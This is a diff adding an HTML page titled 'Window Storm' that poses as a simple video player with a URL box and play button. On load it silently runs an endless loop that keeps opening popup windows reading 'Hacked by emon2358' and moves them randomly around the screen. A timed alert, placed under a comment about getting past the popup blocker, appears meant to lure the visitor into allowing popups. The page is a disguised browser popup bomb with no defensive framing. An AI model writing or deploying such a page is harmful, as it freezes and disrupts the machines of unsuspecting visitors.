@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="ja">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Window Storm</title>
+    <script>
+      function openWindows() {
+        var windows = [];
+
+        function createWindow() {
+          var newWindow = window.open(
+            "about:blank",
+            "_blank",
+            "width=200,height=200"
+          );
+          windows.push(newWindow);
+          addTextToWindow(newWindow);
+          moveWindow(newWindow);
+        }
+
+        function addTextToWindow(windowObj) {
+          var textNode =
+            windowObj.document.createTextNode("Hacked by emon2358");
+          windowObj.document.body.appendChild(textNode);
+        }
+
+        function moveWindow(windowObj) {
+          var screenWidth = screen.availWidth;
+          var screenHeight = screen.availHeight;
+          var windowWidth = windowObj.outerWidth;
+          var windowHeight = windowObj.outerHeight;
+
+          var newX = Math.floor(Math.random() * (screenWidth - windowWidth));
+          var newY = Math.floor(Math.random() * (screenHeight - windowHeight));
+
+          windowObj.moveTo(newX, newY);
+
+          setTimeout(function () {
+            moveWindow(windowObj);
+          }, 1000); // 移動間隔（ミリ秒）
+        }
+
+        while (true) {
+          createWindow();
+        }
+      }
+
+      function playVideo() {
+        var videoURL = document.getElementById("videoURL").value;
+        if (videoURL) {
+          var videoWindow = window.open(
+            videoURL,
+            "_blank",
+            "width=800,height=600"
+          );
+          if (videoWindow) {
+            videoWindow.addEventListener("load", function () {
+              var allowPopup = confirm("この動画を再生しますか？");
+              if (allowPopup) {
+                // videoWindow.play(); // 動画再生のコードをここに追加
+              }
+            });
+          }
+        }
+      }
+
+      window.onload = function () {
+        openWindows();
+      };
+
+      // ポップアップブロッカーを無効にするためのメッセージを表示
+      window.addEventListener("load", function () {
+        setTimeout(function () {
+          alert("lets go play movie!!");
+        }, 2000); // ページ読み込み後2秒待機して表示
+      });
+    </script>
+  </head>
+  <body>
+    <div>
+      <label for="videoURL">動画のURL:</label>
+      <input type="text" id="videoURL" />
+      <button onclick="playVideo()">再生</button>
+    </div>
+  </body>
+</html>
